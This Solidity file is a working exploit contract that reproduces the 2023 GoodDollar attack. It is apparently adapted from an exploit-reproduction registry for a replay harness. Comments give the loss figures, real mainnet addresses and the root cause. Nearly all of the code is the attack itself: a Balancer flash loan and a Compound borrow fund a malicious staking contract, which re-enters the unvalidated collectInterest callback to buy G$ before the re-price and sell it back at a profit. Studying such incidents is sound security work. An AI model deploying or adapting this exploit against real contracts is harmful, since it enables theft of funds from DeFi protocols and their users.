// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../interface.sol";

// @KeyInfo - Total Lost : ~$2M (625,140.23 DAI + 10,213,394,832.90 G$ minted off the
// GoodDollar Bancor reserve). Info from GoodDollar_exp.md / output.txt in the registry.
// Exploiter EOA  : https://etherscan.io/address/0x6738fa889ff31f82d9fe8862ec025dbe318f3fde
// Attack Contract: https://etherscan.io/address/0xf06ab383528f51da67e2b2407327731770156ed6
// Victim Contract: https://etherscan.io/address/0x0c6c80d2061afa35e160f3799411d83bdeea0a5a (GoodFundManager proxy)
// Attack Tx      : https://app.blocksec.com/explorer/tx/eth/0x726459a46839c915ee2fb3d8de7f986e3c7391c605b7a622112161a84c7384d0
//
// Standalone synthetic exploit contract, derived from the registry's
// test/GoodDollar_exp.sol. The original Foundry test runs the WHOLE attack
// inline on `ContractTest is Test` (no separate exploit contract deployed by
// the test itself) and, right before repaying the Balancer flash loan, uses
// `vm.prank(originalExploitContract); WrappedEther.transferFrom(participant,
// address(this), 123e15);` to impersonate the REAL on-chain attack contract
// (which already held `participant`'s pre-existing WETH allowance from
// before this attack tx) and pull in a 0.123 WETH top-up. That cheatcode has
// no equivalent in the Playground's cheatcode-free replay harness. It is
// replaced by ONE unrecorded `setup.steps` rawCall (see
// scripts/poc-configs/2023-12-GoodDollar.mjs) that impersonates
// `originalExploitContract` directly (a literal `caller`, no cheatcode
// needed) and sends the same transferFrom straight to the deployed exploit
// contract before attack() runs. The 0.123 WETH then simply sits in the
// exploit's WETH balance, untouched, until the final repay transfer at the
// end of receiveFlashLoan -- same net effect as doing it mid-attack, since
// nothing in between consumes the WETH balance destructively.
//
// Root cause: GoodFundManager.collectInterest(address[] _stakingContracts, bool)
// is a permissionless keeper function that loops over a CALLER-SUPPLIED array
// of "staking contracts" and calls collectUBIInterest(reserve) on each one,
// with no check that the address is actually a registered staking contract
// (unlike the sibling mintReward(), which does check). The attacker passes
// its own MaliciousStakingContract; when collectInterest calls back into
// collectUBIInterest, the attacker reentrantly buys G$ off the Bancor bonding
// curve. Right after the callback returns, collectInterest calls mintUBI(),
// which mints "interest + expansion" G$ and re-prices the curve. By entering
// this window twice, the attacker accumulates a large G$ position bought
// cheaply before the re-price, then sells it all back for far more cDAI than
// it paid -- funded end-to-end by a Balancer WETH flash loan + a Compound
// borrow of the reserve's entire cDAI cash, for zero net starting capital.

interface IGDX is IERC20 {
    function buy(uint256 _tokenAmount, uint256 _minReturn, address _targetAddress) external returns (uint256);

    function sell(
        uint256 _gdAmount,
        uint256 _minReturn,
        address _target,
        address _seller
    ) external returns (uint256, uint256);
}

interface IGoodFundManager {
    function collectInterest(address[] memory _stakingContracts, bool _forceAndWaiverRewards) external;
}

// ICEtherDelegate (from ../interface.sol) doesn't declare `redeem` -- add it,
// mirroring the registry test's `IcETH is ICEtherDelegate`.
interface IcETH is ICEtherDelegate {
    function redeem(
        uint256 redeemTokens
    ) external returns (uint256);
}

contract GoodDollarExploit {
    IBalancerVault private constant Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IWETH private constant WrappedEther = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant GoodDollarToken = IERC20(0x67C5870b4A41D4Ebef24d2456547A03F1f3e094B);
    IcETH private constant cETH = IcETH(payable(0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5));
    ICErc20Delegate private constant cDAI = ICErc20Delegate(payable(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643));
    ICointroller private constant Comptroller = ICointroller(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B);
    IGDX private constant GDX = IGDX(0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0);

    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = address(WrappedEther);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = WrappedEther.balanceOf(address(Balancer));
        Balancer.flashLoan(address(this), tokens, amounts, bytes(""));
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        // Obtain GoodDollar tokens
        WrappedEther.withdraw(39_000 ether);
        WrappedEther.approve(address(cETH), type(uint256).max);
        cETH.mint{value: address(this).balance}();
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(cETH);
        Comptroller.enterMarkets(cTokens);
        uint256 underlyingAmount = cDAI.getCash();
        cDAI.borrow(underlyingAmount);
        DAI.approve(address(cDAI), type(uint256).max);
        cDAI.mint(DAI.balanceOf(address(this)));
        cDAI.approve(address(GDX), type(uint256).max);
        uint256 goodDollarAmountToBuy = (cDAI.balanceOf(address(this)) * 19) / 20;
        GDX.buy(goodDollarAmountToBuy, 1, address(this));

        MaliciousStakingContract maliciousStakingContract = new MaliciousStakingContract();
        // Transfer remaining cDAI amount to malicious staking contract.
        // This will be used to buy GoodDollar for malicious staking contract when calling deposit()
        cDAI.transfer(address(maliciousStakingContract), cDAI.balanceOf(address(this)));

        for (uint256 i; i < 2; ++i) {
            maliciousStakingContract.deposit();
        }
        maliciousStakingContract.transferTokens();

        GoodDollarToken.approve(address(GDX), type(uint256).max);
        // Following amount comes from original attack contract
        // address 0xf06ab383528f51da67e2b2407327731770156ed6 -> parameter '_amount' in deposit()
        uint256 amountToSell = 5_090_998_266_365;
        // Burn GoodDollar amount
        GDX.sell(amountToSell, 1, address(this), address(this));

        cDAI.redeemUnderlying(underlyingAmount);
        cDAI.repayBorrow(underlyingAmount);
        // After repaying borrow withdraw DAI
        cDAI.redeem(cDAI.balanceOf(address(this)));
        // Withdraw ETH
        cETH.redeem(cETH.balanceOf(address(this)));
        WrappedEther.deposit{value: address(this).balance}();
        // In the original attack tx, right before repaying Balancer, there was
        // a transfer/donate of 123e15 WETH from participant
        // (0x6C08f56ff2B15dB7ddf2F123f5BFFB68e308161B), pulled in via a
        // vm.prank(originalExploitContract) impersonation. That top-up is
        // replicated by an unrecorded setup.steps rawCall (config-level,
        // impersonating originalExploitContract directly) that runs BEFORE
        // attack() and lands the same 0.123 WETH here -- it sits untouched
        // until this repay.
        WrappedEther.transfer(address(Balancer), amounts[0]);
    }

    receive() external payable {}
}

contract MaliciousStakingContract {
    IGoodFundManager private constant GoodFundManager = IGoodFundManager(0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A);
    IERC20 private constant GoodDollarToken = IERC20(0x67C5870b4A41D4Ebef24d2456547A03F1f3e094B);
    IGDX private constant GDX = IGDX(0xa150a825d425B36329D8294eeF8bD0fE68f8F6E0);
    ICErc20Delegate private constant cDAI = ICErc20Delegate(payable(0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643));

    function deposit() external {
        address[] memory _stakingContracts = new address[](1);
        _stakingContracts[0] = address(this);
        // Flawed function. Lack of input validation
        GoodFundManager.collectInterest(_stakingContracts, true);

        GoodDollarToken.approve(address(GDX), type(uint256).max);
        GDX.sell(GoodDollarToken.balanceOf(address(this)), 1, address(this), address(this));
    }

    function transferTokens() external {
        cDAI.transfer(msg.sender, cDAI.balanceOf(address(this)));
    }

    // Callback function. This function will be called from collectInterest()
    function collectUBIInterest(
        address _recipient
    ) external returns (uint256, uint256, uint256) {
        cDAI.approve(address(GDX), type(uint256).max);
        // Reentrancy
        GDX.buy(cDAI.balanceOf(address(this)), 1, address(this));
        return (0, 0, 0);
    }
}
